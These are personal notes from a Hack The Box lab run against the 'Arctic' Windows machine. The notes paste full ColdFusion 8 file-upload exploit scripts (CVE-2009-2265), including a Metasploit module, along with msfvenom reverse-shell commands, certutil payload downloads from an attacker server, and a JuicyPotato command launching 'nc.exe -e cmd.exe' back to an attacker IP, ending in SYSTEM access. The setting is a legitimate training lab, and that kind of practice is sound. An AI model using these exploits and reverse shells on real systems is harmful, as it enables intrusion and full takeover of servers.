```

Arctic - HTB - TCM Windows PrivEsc Capstone #1 -f fail
https://app.hackthebox.com/machines/9
IP:10.10.10.11

lessons learned:
- RESET BOXES SOONER TO MINIMIZE FRUSTRATION.
- SeImpersonatePrivilege
- winpeas.bat
```

```
4:23 PM 1/21/2023
┌──(root㉿kali)-[/home/kali/Documents/hackthebox]
└─# nmap -sC -sV  10.10.10.11  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-21 21:24 EST
Nmap scan report for 10.10.10.11
Host is up (0.12s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.04 seconds
```

```
4:31 PM 1/21/2023
navigated through 10.10.10.11:8500		
#navigated through directories and got to login http://10.10.10.11:8500/CFIDE/administrator/

	https://www.exploit-db.com/exploits/14641									
	# directory traversal exploit.
	
	
	http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/ password.properties%00en:		# trying something else
```

```
5:00 PM 1/21/2023
┌──(root㉿kali)-[/home/kali/Documents/hackthebox]
└─# searchsploit ColdFusion 8  

	Adobe ColdFusion 8 - Remote Command Execution (RCE)                                | cfm/webapps/50057.py								# these 2 stood out to me, trying first one
	ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                  | cfm/webapps/16788.rb

	
	
	
	
																											# Exploit Title: Adobe ColdFusion 8 - Remote Command Execution (RCE)
																										# Google Dork: intext:"adobe coldfusion 8"
																										# Date: 24/06/2021
																										# Exploit Author: Pergyz
																										# Vendor Homepage: https://www.adobe.com/sea/products/coldfusion-family.html
																										# Version: 8
																										# Tested on: Microsoft Windows Server 2008 R2 Standard
																										# CVE : CVE-2009-2265

																										#!/usr/bin/python3

																										from multiprocessing import Process
																										import io
																										import mimetypes
																										import os
																										import urllib.request
																										import uuid

																										class MultiPartForm:

																											def __init__(self):
																												self.files = []
																												self.boundary = uuid.uuid4().hex.encode('utf-8')
																												return

																											def get_content_type(self):
																												return 'multipart/form-data; boundary={}'.format(self.boundary.decode('utf-8'))

																											def add_file(self, fieldname, filename, fileHandle, mimetype=None):
																												body = fileHandle.read()

																												if mimetype is None:
																													mimetype = (mimetypes.guess_type(filename)[0] or 'application/octet-stream')

																												self.files.append((fieldname, filename, mimetype, body))
																												return

																											@staticmethod
																											def _attached_file(name, filename):
																												return (f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n').encode('utf-8')

																											@staticmethod
																											def _content_type(ct):
																												return 'Content-Type: {}\r\n'.format(ct).encode('utf-8')

																											def __bytes__(self):
																												buffer = io.BytesIO()
																												boundary = b'--' + self.boundary + b'\r\n'

																												for f_name, filename, f_content_type, body in self.files:
																													buffer.write(boundary)
																													buffer.write(self._attached_file(f_name, filename))
																													buffer.write(self._content_type(f_content_type))
																													buffer.write(b'\r\n')
																													buffer.write(body)
																													buffer.write(b'\r\n')

																												buffer.write(b'--' + self.boundary + b'--\r\n')
																												return buffer.getvalue()

																										def execute_payload():
																											print('\nExecuting the payload...')
																											print(urllib.request.urlopen(f'http://{rhost}:{rport}/userfiles/file/{filename}.jsp').read().decode('utf-8'))

																										def listen_connection():
																											print('\nListening for connection...')
																											os.system(f'nc -nlvp {lport}')

																										if __name__ == '__main__':
																											# Define some information
																											lhost = '10.13.13.125'
																											lport = 4444
																											rhost = "10.10.10.11"
																											rport = 8500
																											filename = uuid.uuid4().hex

																											# Generate a payload that connects back and spawns a command shell
																											print("\nGenerating a payload...")
																											os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.jsp')

																											# Encode the form data
																											form = MultiPartForm()
																											form.add_file('newfile', filename + '.txt', fileHandle=open(filename + '.jsp', 'rb'))
																											data = bytes(form)

																											# Create a request
																											request = urllib.request.Request(f'http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}.jsp%00', data=data)
																											request.add_header('Content-type', form.get_content_type())
																											request.add_header('Content-length', len(data))

																											# Print the request
																											print('\nPriting request...')

																											for name, value in request.header_items():
																												print(f'{name}: {value}')

																											print('\n' + request.data.decode('utf-8'))

																											# Send the request and print the response
																											print('\nSending request and printing response...')
																											print(urllib.request.urlopen(request).read().decode('utf-8'))

																											# Print some information
																											print('\nPrinting some information for debugging...')
																											print(f'lhost: {lhost}')
																											print(f'lport: {lport}')
																											print(f'rhost: {rhost}')
																											print(f'rport: {rport}')
																											print(f'payload: {filename}.jsp')

																											# Delete the payload
																											print("\nDeleting the payload...")
																											os.system(f'rm {filename}.jsp')

																											# Listen for connections and execute the payload
																											p1 = Process(target=listen_connection)
																											p1.start()
																											p2 = Process(target=execute_payload)
																											p2.start()
																											p1.join()
																											p2.join()
																																																

																					##
																					# $Id: coldfusion_fckeditor.rb 11127 2010-11-24 19:35:38Z jduck $
																					##

																					##
																					# This file is part of the Metasploit Framework and may be subject to
																					# redistribution and commercial restrictions. Please see the Metasploit
																					# Framework web site for more information on licensing and terms of use.
																					# http://metasploit.com/framework/
																					##

																					require 'msf/core'

																					class Metasploit3 < Msf::Exploit::Remote

																						Rank = ExcellentRanking

																						include Msf::Exploit::Remote::HttpClient

																						def initialize(info = {})
																							super(update_info(info,
																								'Name'           => 'ColdFusion 8.0.1 Arbitrary File Upload and Execute',
																								'Description'    => %q{
																										This module exploits the Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' File Upload
																									and Execute vulnerability.
																								},
																								'Author'         => [ 'MC' ],
																								'License'        => MSF_LICENSE,
																								'Version'        => '$Revision: 11127 $',
																								'Platform'       => 'win',
																								'Privileged'     => true,
																								'References'     =>
																									[
																										[ 'CVE', '2009-2265' ],
																										[ 'OSVDB', '55684'],
																									],
																								'Targets'        =>
																									[
																										[ 'Universal Windows Target',
																											{
																												'Arch'     => ARCH_JAVA,
																												'Payload'  =>
																													{
																														'DisableNops' => true,
																													},
																											}
																										],
																									],
																								'DefaultTarget'  => 0,
																								'DisclosureDate' => 'Jul 3 2009'
																							))

																							register_options(
																								[
																									Opt::RPORT(80),
																									OptString.new('FCKEDITOR_DIR', [ false, 'The path to upload.cfm ', '/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm' ]),
																								], self.class )
																						end

																						def exploit

																							page  = rand_text_alpha_upper(rand(10) + 1) + ".jsp"

																							dbl = Rex::MIME::Message.new
																							dbl.add_part(payload.encoded, "application/x-java-archive", nil, "form-data; name=\"newfile\"; filename=\"#{rand_text_alpha_upper(8)}.txt\"")
																							file = dbl.to_s
																							file.strip!

																							print_status("Sending our POST request...")

																							res = send_request_cgi(
																								{
																									'uri'		=> "#{datastore['FCKEDITOR_DIR']}",
																									'query'		=> "Command=FileUpload&Type=File&CurrentFolder=/#{page}%00",
																									'version'	=> '1.1',
																									'method'	=> 'POST',
																									'ctype'		=> 'multipart/form-data; boundary=' + dbl.bound,
																									'data'		=> file,
																								}, 5)

																							if ( res and res.code == 200 and res.body =~ /OnUploadCompleted/ )
																								print_status("Upload succeeded! Executing payload...")

																								send_request_raw(
																									{
																										# default path in Adobe ColdFusion 8.0.1.
																										'uri'		=> '/userfiles/file/' + page,
																										'method'	=> 'GET',
																									}, 5)

																								handler
																							else
																								print_error("Upload Failed...")
																								return
																							end

																						end
																					end
																					
																					
```

```
5:30 PM 1/21/2023
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.7 LPORT=5555 -f raw > shell.jsp											# got stuck because vpn has new ip address, smh. Restarting, why does my shit never work.
```

```
5:36 PM 1/21/2023

googling ColdFusion 8.0.1 - Arbitrary File Upload / Execution

																					#!/usr/bin/python
																					# Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload
																					# Date: 2017-10-16
																					# Exploit Author: Alexander Reid
																					# Vendor Homepage: http://www.adobe.com/products/coldfusion-family.html
																					# Version: ColdFusion 8.0.1
																					# CVE: CVE-2009-2265 
																					# 
																					# Description: 
																					# A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1
																					# Uploads the specified jsp file to the remote server.
																					#
																					# Usage: ./exploit.py <target ip> <target port> [/path/to/coldfusion] </path/to/payload.jsp>
																					# Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp
																					import requests, sys

																					try:
																						ip = sys.argv[1]
																						port = sys.argv[2]
																						if len(sys.argv) == 5:
																							path = sys.argv[3]
																							with open(sys.argv[4], 'r') as payload:
																								body=payload.read()
																						else:
																							path = ""
																							with open(sys.argv[3], 'r') as payload:
																								body=payload.read()
																					except IndexError:
																						print 'Usage: ./exploit.py <target ip/hostname> <target port> [/path/to/coldfusion] </path/to/payload.jsp>'
																						print 'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp'
																						sys.exit(-1)

																					basepath = "http://" + ip + ":" + port + path

																					print 'Sending payload...'

																					try:
																						req = requests.post(basepath + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/exploit.jsp%00", files={'newfile': ('exploit.txt', body, 'application/x-java-archive')}, timeout=30)
																						if req.status_code == 200:
																							print 'Successfully uploaded payload!\nFind it at ' + basepath + '/userfiles/file/exploit.jsp'
																						else:
																							print 'Failed to upload payload... ' + str(req.status_code) + ' ' + req.reason
																					except requests.Timeout:
																						print 'Failed to upload payload... Request timed out'\
```

```																						
5:38 PM 1/21/2023			
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.7 LPORT=1234 -f raw > reverse.jsp				# making new payload
```

```
5:40 PM 1/21/2023
python 2 coldfusion8.py 10.10.10.11 8500 reverse.jsp
```

```
5:43 PM 1/21/2023
root㉿kali)-[/home/kali/Documents/hackthebox/arctic_windows_privesc_1]								# did not work going to try metasploit - METASPLOIT DID NOT WORK RESETING BOX
└─# python2 coldfusion8.py 10.10.10.11 8500 reverse.jsp
Sending payload...
Failed to upload payload... Request timed out
```
```                                                          
														  
#######################					LITERALLY JUST DID THE SAME DAMN THING AND IT WORKED AFTER RESETING THE BOX......... RESET BOXES SOONER TO MINIMIZE FRUSTRATION.								
```

```
6:00 PM 1/21/2023
root㉿kali)-[/home/kali/Documents/hackthebox/arctic_windows_privesc_1]
└─# python2 coldfusion8.py 10.10.10.11 8500 reverse.jsp
Sending payload...
Successfully uploaded payload!
Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp
```
```
6:00 PM 1/21/2023
On box.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>
```

```
6:01 PM 1/21/2023																									# user flag.
C:\Users\tolis\Desktop>type user.txt
type user.txt
bd0d0c72a093661b6a7cf693f13bd1fd
```

```
6:02 PM 1/21/2023																									# putting winpeas on. - ran system info, x64
```

```
6:04 PM 1/21/2023																									# hosting http server
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# python3 -m http.server               
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...







certutil -urlcache -f http://10.10.16.7:8000/winPEASx64.exe win64.exe												# cant execute winPEASE, going to xfer powerup


certutil -urlcache -f http://10.10.16.7:8000/PowerUp.ps1 PowerUp.ps1												# nope


powershell -ep bypass .\PowerUp.ps1																					# nope
```

```
6:14 PM 1/21/2023

C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 									# juicy potato
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\ColdFusion8\runtime\bin>
```

```
6:19 PM 1/21/2023
Downloaded PrintSpoofer.exe																							#github
```

```
6:19 PM 1/21/2023
certutil -urlcache -f http://10.10.16.7:8000/PrintSpoofer.exe PrintSpoofer.exe										# successful transfer to target
```

```
6:20 PM 1/21/2023
Nothing is working, copying systeminfo onto linux box to see what we can do.


Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          23/1/2023, 1:50:52 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 4.828 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 10.940 MB
Virtual Memory: In Use:    1.345 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```

```
6:27 PM 1/21/2023	# ran wesng to see how we can esxcalate considering cannot execute anything
┌──(root㉿kali)-[/home/kali/Documents/transfer/wesng]
└─# python3 wes.py sysinfo.txt
```

```
6:28 PM 1/21/2023
Date: 20110208																							# nice lets look into this
CVE: CVE-2010-4398
KB: KB2393802
Title: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: http://www.exploit-db.com/bypassing-uac-with-user-privilege-under-windows-vista7-mirror/, http://www.exploit-db.com/exploits/15609/
```

```
6:45 PM 1/21/2023
Setting up metasploit module to use local exploit suggester.			# nope


																																	7:22 PM 1/21/2023
																																	Setting up juicypotato.exe


																																	certutil -urlcache -f http://10.10.16.7:8000/juicypotato.exe juicypotato.exe

																																	juicypotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *



																																	msfvenom -p cmd/windows/reverse_powershell lhost=10.10.16.7 lport=9999 > myshell.bat

																																	certutil -urlcache -f http://10.10.16.7:8000/myshell.bat myshell.bat


																																	juicypotato.exe -t * -p shell.bat -l 4444 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"				# DID NOT WORK.
																																				
																																				DID NOT WORK
```

```
7:34 PM 1/21/2023
certutil -urlcache -f http://10.10.16.7:8000/Chimichurri.exe exe.exe									# xferred chimicurri to arctic box.
```

```
7:36 PM 1/21/2023
exe.exe 10.10.16.7 1212
```

```
7:38 PM 1/21/2023				# worked, but i dont really understand how they got the chimichurri vulnerability. very burnt out today going to have to start off tomorrow with capstone 1 again.
C:\ColdFusion8\runtime\bin>whoami
whoami
nt authority\system


# worked, but i dont really understand how they got the chimichurri vulnerability. very burnt out today going to have to start off tomorrow with capstone 1 again.
# have issues with my priv esc tool, might need to have to find another tomorrow.